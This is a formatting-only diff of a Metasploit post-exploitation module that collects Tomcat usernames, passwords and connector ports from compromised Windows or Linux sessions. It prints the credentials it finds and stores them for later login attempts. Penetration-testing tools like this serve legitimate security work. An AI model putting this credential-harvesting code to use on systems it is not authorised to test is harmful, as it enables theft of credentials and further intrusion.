@@ -3,24 +3,26 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Services
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Gather Tomcat Credentials',
-      'Description'   => %q{
-        This module will attempt to collect credentials from Tomcat services running on the machine.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [
-        'Koen Riepe <koen.riepe@fox-it.com>', # Module author
-      ],
-      'Platform'      => [ 'win', 'linux' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Gather Tomcat Credentials',
+        'Description' => %q{
+          This module will attempt to collect credentials from Tomcat services running on the machine.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Koen Riepe <koen.riepe@fox-it.com>', # Module author
+        ],
+        'Platform' => [ 'win', 'linux' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
   end
 
   $username = []
@@ -30,34 +32,35 @@ class MetasploitModule < Msf::Post
 
   def report_creds(user, pass, port)
     return if (user.empty? or pass.empty?)
-      # Assemble data about the credential objects we will be creating
-      credential_data = {
-        origin_type: :session,
-        post_reference_name: self.fullname,
-        private_data: pass,
-        private_type: :password,
-        session_id: session_db_id,
-        username: user,
-        workspace_id: myworkspace_id,
-      }
 
-      credential_core = create_credential(credential_data)
+    # Assemble data about the credential objects we will be creating
+    credential_data = {
+      origin_type: :session,
+      post_reference_name: self.fullname,
+      private_data: pass,
+      private_type: :password,
+      session_id: session_db_id,
+      username: user,
+      workspace_id: myworkspace_id,
+    }
 
-      if not port.is_a? Integer
-        port = 8080
-        print_status("Port not an Integer, defaulting to port #{port} for creds database")
-      end
+    credential_core = create_credential(credential_data)
 
-      login_data = {
-            core: credential_core,
-            status: Metasploit::Model::Login::Status::UNTRIED,
-            address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
-            port: port,
-            service_name: 'Tomcat',
-            protocol: 'tcp',
-            workspace_id: myworkspace_id
-        }
-        create_credential_login(login_data)
+    if not port.is_a? Integer
+      port = 8080
+      print_status("Port not an Integer, defaulting to port #{port} for creds database")
+    end
+
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
+      port: port,
+      service_name: 'Tomcat',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+    create_credential_login(login_data)
   end
 
   def gatherwin
@@ -103,10 +106,10 @@ class MetasploitModule < Msf::Post
         comment_block = false
         xml.each do |line|
           if line.include? "<Connector" and not comment_block
-            i=0
+            i = 0
             while i < $username.count
               $port.push(line.split('<Connector port="')[1].split('"')[0].to_i)
-              i+=1
+              i += 1
             end
           elsif line.include? ("<!--")
             comment_block = true
@@ -160,10 +163,10 @@ class MetasploitModule < Msf::Post
             comment_block = false
             xml.each do |line|
               if line.include? "<Connector" and not comment_block
-                i=0
+                i = 0
                 while i < $username.count
                   $port.push(line.split('<Connector port="')[1].split('"')[0].to_i)
-                  i+=1
+                  i += 1
                 end
               elsif line.include? ("<!--")
                 comment_block = true
@@ -196,11 +199,11 @@ class MetasploitModule < Msf::Post
       print_status("No user credentials have been found")
     end
 
-    i=0
+    i = 0
     while i < $username.count
       print_good("Username and password found in #{$paths[i]} - #{$username[i]}:#{$password[i]}")
-      report_creds($username[i],$password[i],$port[i])
-      i+=1
+      report_creds($username[i], $password[i], $port[i])
+      i += 1
     end
 
     $username = []
